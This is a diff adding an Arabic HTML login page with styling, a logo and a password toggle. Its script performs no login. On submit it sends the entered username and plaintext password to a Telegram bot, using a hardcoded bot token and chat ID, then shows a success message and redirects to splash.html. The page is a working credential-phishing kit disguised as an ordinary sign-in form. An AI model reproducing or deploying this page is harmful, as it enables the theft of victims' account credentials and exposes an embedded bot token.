@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تسجيل الدخول</title>
+
+<!-- خط قريب جدًا من الصورة (Tajawal) -->
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+<style>
+:root{
+--bg-dark:#0f1420; /* خلفية داكنة */
+--card:#111826; /* لون أساس للكارت قبل الشفافية */
+--text:#e6e9f0; /* لون النص الفاتح */
+--muted:#b9bfd0; /* نص خافت */
+--accent:#ff6a2b; /* زر برتقالي */
+--accent-hover:#ff7f4a;
+--border:rgba(255,255,255,.12);
+--input-bg:rgba(20,27,43,.65);
+--blur:18px;
+--radius:18px;
+--shadow:0 10px 30px rgba(0,0,0,.35);
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+margin:0;
+font-family:"Tajawal", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+background: var(--bg-dark) no-repeat center/cover fixed;
+color:var(--text);
+/* الخلفية الرئيسية */
+background-image: url('etehad.png');
+position:relative;
+overflow:auto;
+}
+
+/* تظليل ناعم أعلى الخلفية ليشبه الصورة */
+body::before{
+content:"";
+position:fixed;
+inset:0;
+background:
+radial-gradient(1200px 600px at 80% 0%, rgba(255,255,255,.06), transparent 60%),
+linear-gradient(180deg, rgba(0,0,0,.35), rgba(0,0,0,.55));
+pointer-events:none;
+}
+
+.wrap{
+min-height:100%;
+display:grid;
+place-items:center;
+padding:32px 16px 56px;
+}
+
+.card{
+width: 340px;
+background: rgba(38,38,50,.1);
+border: 1px solid var(--border);
+border-radius: var(--radius);
+box-shadow: var(--shadow);
+padding: 40px 28px 28px;
+position:relative;
+overflow:hidden;
+
+/* السحر: تغبيش الخلفية */
+-webkit-backdrop-filter: blur(var(--blur));
+backdrop-filter: blur(var(--blur));
+}
+
+/* زخرفة زاوية تشبه قَطعة منحنية */
+.card::before{
+content:"";
+position:absolute; inset:-40% -20% auto auto;
+width:70%; height:70%;
+background: radial-gradient( circle at 100% 0%, rgba(255,255,255,.05), transparent 60% );
+transform: rotate(-18deg);
+pointer-events:none;
+}
+
+.logo{
+display:grid; place-items:center;
+margin-bottom:10px;
+}
+.logo img{
+width:72px; height:72px; object-fit:contain; filter: drop-shadow(0 2px 8px rgba(0,0,0,.35));
+}
+
+h1{
+margin:0 0 8px 0;
+font-weight:800;
+font-size: 40px;
+letter-spacing:.5px;
+text-align:center;
+}
+.subtitle{
+text-align:center;
+color:var(--muted);
+margin:0 0 26px 0;
+font-size:18px;
+line-height:1.7;
+}
+
+.label{
+display:block;
+margin:18px 6px 8px;
+color:#d6d9e3;
+font-size:16px;
+}
+
+.input{
+position:relative;
+}
+.input input{
+width:100%;
+background: var(--input-bg);
+color: var(--text);
+border: 1px solid var(--border);
+border-radius: 14px;
+padding: 18px 16px 18px 46px;
+font-size: 20px;
+outline: none;
+transition: border-color .2s, box-shadow .2s;
+}
+.input input::placeholder{ color:#99a2b7; }
+.input input:focus{
+border-color: rgba(255,255,255,.28);
+box-shadow: 0 0 0 4px rgba(255,255,255,.06);
+}
+
+/* زر إظهار كلمة المرور داخل الحقل */
+.toggle-eye{
+position:absolute;
+inset:0 auto 0 12px;
+width:42px; height:100%;
+display:grid; place-items:center;
+cursor:pointer; border:none; background:transparent;
+}
+.toggle-eye svg{ width:22px; height:22px; opacity:.85; fill: #fff; stroke: #fff; }
+
+.actions{
+display:flex;
+ gap:14px;
+ justify-content:space-between;
+ flex-wrap:wrap;
+margin-top:18px;
+color:var(--muted);
+font-size:12px;
+}
+.actions a{
+color:var(--muted); text-decoration:none;
+}
+.actions a:hover{ text-decoration:underline }
+
+.submit{
+position:fixed; left:50%; transform:translateX(-50%);
+bottom:22px;
+width: min(700px, 90vw);
+background: var(--accent);
+color:#fff;
+border:none;
+border-radius: 12px;
+padding: 18px 24px;
+font-size: 26px;
+font-weight:700;
+cursor:pointer;
+box-shadow: 0 10px 18px rgba(255,106,43,.3);
+transition: transform .05s, background .2s, box-shadow .2s;
+}
+.submit:active{ transform:translateX(-50%) scale(.99) }
+.submit:hover{ background: var(--accent-hover); box-shadow: 0 12px 24px rgba(255,106,43,.35); }
+
+/* حاوية لرسائل التنبيه */
+.toast{
+position:fixed; top:16px; left:50%; transform:translateX(-50%);
+background:rgba(38,38,50,.85); color:#fff; border:1px solid var(--border);
+padding:12px 16px; border-radius:12px; box-shadow:var(--shadow);
+font-size:16px; display:none;
+}
+
+@media (max-width:520px){
+h1{ font-size:34px }
+.subtitle{ font-size:16px }
+.input input{ font-size:18px; padding:16px 14px }
+.submit{ font-size:22px }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+<form class="card" id="loginForm" autocomplete="on">
+<div class="logo">
+<!-- استبدل المسار حسب ملف الشعار لديك -->
+<img src="logo.png" alt="الشعار">
+</div>
+
+<h1>مرحباً</h1>
+<p class="subtitle">أدخل اسم المستخدم وكلمة المرور للوصول إلى حسابك بأمان</p>
+
+<label class="label" for="username">اسم المستخدم</label>
+<div class="input">
+<input id="username" name="username" placeholder="إدخال اسم المستخدم" required>
+</div>
+
+<label class="label" for="password">كلمة المرور</label>
+<div class="input">
+<input id="password" name="password" type="password" placeholder="إدخال كلمة المرور" required>
+<button class="toggle-eye" type="button" aria-label="إظهار/إخفاء كلمة المرور">
+<!-- أيقونة عين SVG -->
+<svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+<path d="M12 5c-5.5 0-9.5 4.4-10.7 6 1.2 1.6 5.2 6 10.7 6s9.5-4.4 10.7-6C21.5 9.4 17.5 5 12 5zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-2.2a1.8 1.8 0 1 0 0-3.6 1.8 1.8 0 0 0 0 3.6z"/>
+</svg>
+</button>
+</div>
+
+<div class="actions">
+<a href="#" id="resetLink">إعادة تعيين كلمة المرور؟</a>
+<a href="#" id="forgotLink">نسيت اسم المستخدم؟</a>
+</div>
+</form>
+</div>
+
+<button class="submit" form="loginForm" type="submit">تسجيل الدخول</button>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// تبديل رؤية كلمة المرور
+const pass = document.getElementById('password');
+document.querySelector('.toggle-eye').addEventListener('click', () => {
+pass.type = pass.type === 'password' ? 'text' : 'password';
+});
+
+// تنبيه بسيط
+function showToast(msg){
+const t = document.getElementById('toast');
+t.textContent = msg;
+t.style.display = 'block';
+setTimeout(() => t.style.display = 'none', 2600);
+}
+
+// === إعدادات تيليجرام ===
+// الخيار (أ): إرسال مباشر — غير آمن (التوكن مكشوف)
+const TG_DIRECT = {
+enabled: true, // غيّرها إلى false إذا ستستخدم خادمًا وسيطًا
+botToken: '8329394212:AAEoTZ5qvy9Dz4-ew9mjLIm_8mgxGeP4gtA', // ضع توكن البوت هنا
+chatId: '5450865891' // ضع رقم chat_id (شخصي أو قناة/جروب مع إضافة البوت)
+};
+
+// الخيار (ب): عبر خادم وسيط (مُستحسن)
+// ارفع سكربت بسيط على خادمك يستقبل POST ثم يستدعي Telegram API سريًا.
+// مثال endpoint:
+// const PROXY_ENDPOINT = 'https://your-domain.com/telegram-proxy';
+const PROXY_ENDPOINT = '';
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+e.preventDefault();
+const username = document.getElementById('username').value.trim();
+const password = document.getElementById('password').value;
+
+if(!username || !password){ showToast('يرجى تعبئة الحقول المطلوبة'); return; }
+
+// حضّر الرسالة
+const text = `طلب تسجيل دخول:\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
+
+try{
+if(PROXY_ENDPOINT){
+// إرسال آمن عبر خادمك
+const r = await fetch(PROXY_ENDPOINT, {
+method: 'POST',
+headers: {'Content-Type':'application/json'},
+body: JSON.stringify({ text, username, password })
+});
+if(!r.ok) throw new Error('Proxy error');
+}else if(TG_DIRECT.enabled){
+// إرسال مباشر إلى Telegram (يعرض التوكن للعميل)
+const url = `https://api.telegram.org/bot${TG_DIRECT.botToken}/sendMessage`;
+const r = await fetch(url, {
+method: 'POST',
+headers: {'Content-Type':'application/json'},
+body: JSON.stringify({
+chat_id: TG_DIRECT.chatId,
+text,
+parse_mode: 'HTML',
+disable_web_page_preview: true
+})
+});
+if(!r.ok) throw new Error('Telegram error');
+}else{
+throw new Error('لم يتم ضبط وسيلة الإرسال');
+}
+
+showToast('تم الإرسال بنجاح');
+    setTimeout(() => {
+      window.location.href = 'splash.html'; // إعادة التوجيه إلى splash.html
+    }, 2600);
+e.target.reset();
+}catch(err){
+console.error(err);
+showToast('تعذّر الإرسال، حاول لاحقًا');
+}
+});
+
+// روابط شكلية فقط (يمكن ربطها بصفحات لاحقًا)
+document.getElementById('resetLink').addEventListener('click', (e)=>{ e.preventDefault(); showToast('رابط إعادة التعيين قادم لاحقًا')});
+document.getElementById('forgotLink').addEventListener('click', (e)=>{ e.preventDefault(); showToast('رابط الاسترجاع قادم لاحقًا')});
+</script>
+</body>
+</html>
